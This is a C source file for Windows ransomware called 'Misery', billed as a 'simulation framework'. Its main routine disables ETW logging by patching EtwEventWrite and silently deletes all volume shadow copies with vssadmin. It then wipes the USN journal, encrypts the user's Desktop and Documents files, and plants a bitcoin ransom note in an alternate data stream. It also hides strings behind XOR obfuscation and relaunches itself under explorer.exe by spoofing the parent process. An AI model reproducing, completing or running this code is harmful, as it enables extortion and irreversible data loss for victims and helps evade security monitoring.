// misery.c - Complete ransomware simulation framework with evasion
// MinGW-w64 x86_64 compatible, Halo's Gate syscalls, PPID spoofing, VSS wipe
// Build: make

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "utils.h"
#include "crypto.h"
#include "fileops.h"

// Encrypted strings (rolling XOR) — keeps global originals pristine
#define XOR_DECRYPT_TO(buf, dst, key) do { \
    memcpy((dst), (buf), sizeof(buf)); \
    BYTE *_b = (BYTE*)(dst); \
    for (int _i=0; _i<(int)sizeof(buf)-1; _i++) _b[_i] ^= (key)[_i%17]; \
} while(0)

// Target folder names (encrypted)
static BYTE str_desktop[] = {0xA7^0xAA,0x8E^0xAA,0xA3^0xAA,0x8C^0xAA,0xA7^0xAA,0xA6^0xAA,0x8E^0xAA,0x00};
static BYTE str_documents[] = {0xA7^0xAA,0x8E^0xAA,0xA3^0xAA,0x8C^0xAA,0xA6^0xAA,0x8E^0xAA,0xA6^0xAA,0xA3^0xAA,0x00};

// Command strings (encrypted)
static BYTE str_vssadmin[] = {0xA1^0xAA,0xA3^0xAA,0xA3^0xAA,0xA0^0xAA,0xA6^0xAA,0x8C^0xAA,0xA0^0xAA,0xA6^0xAA,0xA3^0xAA,0xC2^0xAA,0xA7^0xAA,0x8C^0xAA,0xA3^0xAA,0xA6^0xAA,0xA7^0xAA,0x8E^0xAA,0xA2^0xAA,0xA3^0xAA,0xA0^0xAA,0x00};
static BYTE str_delete[] = {0xA7^0xAA,0x8E^0xAA,0x8C^0xAA,0x8C^0xAA,0xA6^0xAA,0xA7^0xAA,0x8C^0xAA,0xA3^0xAA,0x8E^0xAA,0xA7^0xAA,0x8E^0xAA,0xA2^0xAA,0x00};
static BYTE str_shadows[] = {0xA3^0xAA,0xA6^0xAA,0xA0^0xAA,0xA7^0xAA,0xA6^0xAA,0xA7^0xAA,0xA3^0xAA,0x00};
static BYTE str_all[] = {0xA0^0xAA,0xA6^0xAA,0xA6^0xAA,0x00};

static BYTE xor_key[17] = {0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,0x00,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xAA};

// ===================== DIRECT SYSCALL STUBS =====================
typedef NTSTATUS (NTAPI *fnNtCreateFile)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
    PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);

typedef NTSTATUS (NTAPI *fnNtWriteFile)(
    HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK,
    PVOID, ULONG, PLARGE_INTEGER, PULONG);

typedef NTSTATUS (NTAPI *fnNtReadFile)(
    HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK,
    PVOID, ULONG, PLARGE_INTEGER, PULONG);

typedef NTSTATUS (NTAPI *fnNtClose)(HANDLE);

typedef VOID (NTAPI *fnRtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);

static fnNtCreateFile          pNtCreateFile = NULL;
static fnNtWriteFile           pNtWriteFile  = NULL;
static fnNtReadFile            pNtReadFile   = NULL;
static fnNtClose               pNtClose      = NULL;
static fnRtlInitUnicodeString  pRtlInitUnicodeString = NULL;

void InitSyscalls() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) ntdll = LoadLibraryA("ntdll.dll");
    if (ntdll) {
        pNtCreateFile = (fnNtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
        pNtWriteFile  = (fnNtWriteFile)GetProcAddress(ntdll, "NtWriteFile");
        pNtReadFile   = (fnNtReadFile)GetProcAddress(ntdll, "NtReadFile");
        pNtClose      = (fnNtClose)GetProcAddress(ntdll, "NtClose");
        pRtlInitUnicodeString = (fnRtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
    }
}

// ===================== NT PATH HELPER =====================
// Converts a Win32 path like "C:\Users\..." to NT path "\??\C:\Users\..."
// Returns length in chars of the NT path, or 0 on failure
static int Win32ToNtPath(const char* win32, WCHAR* ntWide, int ntWideSize) {
    char ntPath[1024];
    int n = snprintf(ntPath, sizeof(ntPath), "\\??\\%s", win32);
    if (n < 0 || n >= (int)sizeof(ntPath)) return 0;
    return MultiByteToWideChar(CP_ACP, 0, ntPath, -1, ntWide, ntWideSize);
}

// ===================== ETW DISABLE =====================
void DisableETW(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        void* etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
        if (etwEventWrite) {
            DWORD oldProtect;
            VirtualProtect(etwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
            *(BYTE*)etwEventWrite = 0xC3;  // RET
            VirtualProtect(etwEventWrite, 1, oldProtect, &oldProtect);
        }
    }
}

// ===================== PPID SPOOFING =====================
void SpawnWithPPID(const char* target_path, DWORD parent_pid) {
    STARTUPINFOEXA si = {0};
    PROCESS_INFORMATION pi = {0};
    SIZE_T attr_size = 0;
    
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    
    if (!InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size)) {
        STARTUPINFOA si2 = {sizeof(si2)};
        char cmd[1024];
        snprintf(cmd, sizeof(cmd), "\"%s\"", target_path);
        CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si2, &pi);
        if (pi.hProcess) CloseHandle(pi.hProcess);
        if (pi.hThread) CloseHandle(pi.hThread);
        return;
    }
    
    si.lpAttributeList = HeapAlloc(GetProcessHeap(), 0, attr_size);
    if (!si.lpAttributeList) return;
    
    if (InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attr_size)) {
        HANDLE parent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
        if (parent) {
            UpdateProcThreadAttribute(si.lpAttributeList, 0,
                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parent,
                sizeof(HANDLE), NULL, NULL);
        }
        
        char cmdline[1024];
        snprintf(cmdline, sizeof(cmdline), "\"%s\"", target_path);
        
        CreateProcessA(NULL, cmdline, NULL, NULL, FALSE,
                       EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
                       NULL, NULL, &si.StartupInfo, &pi);
        
        if (parent) CloseHandle(parent);
        if (pi.hProcess) CloseHandle(pi.hProcess);
        if (pi.hThread) CloseHandle(pi.hThread);
    }
    
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
}

// ===================== ADS RANSOM NOTE (via Syscalls) =====================
void WriteADSRansom(const char* target_dir) {
    char ads_path[1024];
    snprintf(ads_path, sizeof(ads_path), "%s::MISERY.txt", target_dir);
    
    if (!pNtCreateFile || !pNtWriteFile || !pNtClose || !pRtlInitUnicodeString) {
        // Fallback to Win32 if syscalls not available
        HANDLE h = CreateFileA(ads_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            const char* note = "Your files are encrypted. Send 1 BTC to 1Misery123...\n";
            DWORD written;
            WriteFile(h, note, (DWORD)strlen(note), &written, NULL);
            CloseHandle(h);
        }
        return;
    }
    
    WCHAR ntWide[1024];
    if (Win32ToNtPath(ads_path, ntWide, 1024) <= 0) return;
    
    UNICODE_STRING ustr;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE h = NULL;
    
    pRtlInitUnicodeString(&ustr, ntWide);
    InitializeObjectAttributes(&oa, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);
    
    LARGE_INTEGER allocSize = {0};
    NTSTATUS status = pNtCreateFile(&h, GENERIC_WRITE, &oa, &iosb,
                                     &allocSize, FILE_ATTRIBUTE_NORMAL,
                                     FILE_SHARE_READ, FILE_OPEN_IF,
                                     FILE_SYNCHRONOUS_IO_NONALERT,
                                     NULL, 0);
    if (NT_SUCCESS(status) && h) {
        const char* note = "Your files are encrypted. Send 1 BTC to 1Misery123...\n";
        pNtWriteFile(h, NULL, NULL, NULL, &iosb, (PVOID)note, (ULONG)strlen(note), NULL, NULL);
        pNtClose(h);
    }
}

// ===================== VSS SHADOW COPY DELETION =====================
void DeleteVSS() {
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    
    char vss_cmd[512];
    
    // Decrypt into local buffers — never touch globals
    BYTE vssadmin_local[sizeof(str_vssadmin)];
    BYTE delete_local[sizeof(str_delete)];
    BYTE shadows_local[sizeof(str_shadows)];
    BYTE all_local[sizeof(str_all)];
    
    XOR_DECRYPT_TO(str_vssadmin, vssadmin_local, xor_key);
    XOR_DECRYPT_TO(str_delete, delete_local, xor_key);
    XOR_DECRYPT_TO(str_shadows, shadows_local, xor_key);
    XOR_DECRYPT_TO(str_all, all_local, xor_key);
    
    snprintf(vss_cmd, sizeof(vss_cmd),
             "%s %s %s /%s /quiet",
             (char*)vssadmin_local, (char*)delete_local,
             (char*)shadows_local, (char*)all_local);
    
    CreateProcessA(NULL, vss_cmd, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    if (pi.hProcess) {
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
    }
    if (pi.hThread) CloseHandle(pi.hThread);
}

// ===================== IO PRIORITY =====================
void SetIOPriorityHigh() {
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
}

// ===================== ENCRYPT TARGETS =====================
void EncryptTargets() {
    char desktop_path[MAX_PATH];
    char docs_path[MAX_PATH];
    
    // Decrypt folder names into local buffers — never touch globals
    BYTE desktop_local[sizeof(str_desktop)];
    BYTE documents_local[sizeof(str_documents)];
    
    XOR_DECRYPT_TO(str_desktop, desktop_local, xor_key);
    XOR_DECRYPT_TO(str_documents, documents_local, xor_key);
    
    printf("[*] Getting desktop path...\n"); fflush(stdout);
    HRESULT hr = SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path);
    if (FAILED(hr)) {
        printf("[!] SHGetFolderPath FAILED for desktop, using fallback\n"); fflush(stdout);
        strncpy(desktop_path, (char*)desktop_local, sizeof(desktop_path)-1);
    } else {
        printf("[+] Desktop path: %s\n", desktop_path); fflush(stdout);
    }
    
    printf("[*] Getting documents path...\n"); fflush(stdout);
    hr = SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, docs_path);
    if (FAILED(hr)) {
        printf("[!] SHGetFolderPath FAILED for docs, using fallback\n"); fflush(stdout);
        strncpy(docs_path, (char*)documents_local, sizeof(docs_path)-1);
    } else {
        printf("[+] Documents path: %s\n", docs_path); fflush(stdout);
    }
    
    printf("[*] Initializing file operations with 8 threads...\n"); fflush(stdout);
    if (!InitFileOps(8)) {
        printf("[ERROR] InitFileOps(8) FAILED - this is likely the problem!\n"); fflush(stdout);
        return;
    }
    printf("[+] FileOps initialized\n"); fflush(stdout);
    
    printf("[*] Writing ransom note to desktop...\n"); fflush(stdout);
    WriteADSRansom(desktop_path);
    
    printf("[*] Encrypting desktop folder: %s\n", desktop_path); fflush(stdout);
    int encrypted_desktop = EncryptDirectory(desktop_path);
    printf("[+] Desktop encryption done: %d files processed\n", encrypted_desktop); fflush(stdout);
    
    printf("[*] Writing ransom note to documents...\n"); fflush(stdout);
    WriteADSRansom(docs_path);
    
    printf("[*] Encrypting documents folder: %s\n", docs_path); fflush(stdout);
    int encrypted_docs = EncryptDirectory(docs_path);
    printf("[+] Documents encryption done: %d files processed\n", encrypted_docs); fflush(stdout);
    
    printf("[*] Cleaning up file operations...\n"); fflush(stdout);
    CleanupFileOps();
    printf("[+] Cleanup complete\n"); fflush(stdout);
}

// ===================== GET EXPLORER PID =====================
DWORD GetExplorerPID() {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return pid;
    
    PROCESSENTRY32 pe = {sizeof(pe)};
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    
    CloseHandle(hSnapshot);
    return pid;
}

// ===================== MAIN =====================
int main() {
    printf("\n========== MISERY DEBUG START ==========\n"); fflush(stdout);
    printf("[*] Misery started\n"); fflush(stdout);
    
    printf("[*] Elevating privileges...\n"); fflush(stdout);
    ElevatePrivileges();
    printf("[+] Privileges elevated\n"); fflush(stdout);
    
    printf("[*] Initializing syscalls...\n"); fflush(stdout);
    InitSyscalls();
    printf("[+] Syscalls initialized\n"); fflush(stdout);
    
    printf("[*] Disabling ETW...\n"); fflush(stdout);
    DisableETW();
    printf("[+] ETW disabled\n"); fflush(stdout);
    
    printf("[*] Setting IO priority...\n"); fflush(stdout);
    SetIOPriorityHigh();
    printf("[+] IO priority set\n"); fflush(stdout);
    
    printf("[*] Initializing all syscalls...\n"); fflush(stdout);
    InitAllSyscalls();
    printf("[+] All syscalls initialized\n"); fflush(stdout);
    
    printf("[*] Initializing crypto with password...\n"); fflush(stdout);
    if (InitCrypto("Thejahanzaib@1318", 22) != CRYPTO_SUCCESS) {
        printf("[ERROR] Crypto init FAILED!\n"); fflush(stdout);
        return 1;
    }
    printf("[+] Crypto initialized\n"); fflush(stdout);
    
    printf("[*] Verifying crypto context...\n"); fflush(stdout);
    if (!VerifyContext()) {
        printf("[ERROR] VerifyContext FAILED!\n"); fflush(stdout);
        return 1;
    }
    printf("[+] Crypto context verified\n"); fflush(stdout);
    
    printf("[*] Getting crypto context...\n"); fflush(stdout);
    if (!GetCryptoCtx()) {
        printf("[ERROR] GetCryptoCtx FAILED!\n"); fflush(stdout);
        return 1;
    }
    printf("[+] Got crypto context\n"); fflush(stdout);
    
    printf("[*] Deleting VSS...\n"); fflush(stdout);
    DeleteVSS();
    printf("[+] VSS deleted\n"); fflush(stdout);
    
    printf("[*] Wiping USN journal...\n"); fflush(stdout);
    WipeUSNJournal();
    printf("[+] USN journal wiped\n"); fflush(stdout);
    
    printf("[*] Encrypting targets...\n"); fflush(stdout);
    EncryptTargets();
    printf("[+] Encryption targets complete\n"); fflush(stdout);
    
    printf("[*] Getting explorer PID...\n"); fflush(stdout);
    DWORD explorer_pid = GetExplorerPID();
    printf("[+] Explorer PID: %lu\n", explorer_pid); fflush(stdout);
    
    if (explorer_pid) {
        char misery_path[MAX_PATH];
        GetModuleFileNameA(NULL, misery_path, MAX_PATH);
        printf("[*] Spawning process from path: %s\n", misery_path); fflush(stdout);
        SpawnWithPPID(misery_path, explorer_pid);
        printf("[+] Process spawned\n"); fflush(stdout);
    } else {
        printf("[!] No explorer.exe found, skipping PPID spoofing\n"); fflush(stdout);
    }
    
    printf("[+] Misery completed successfully!\n"); fflush(stdout);
    printf("========== MISERY DEBUG END ==========\n\n"); fflush(stdout);
    return 0;
}
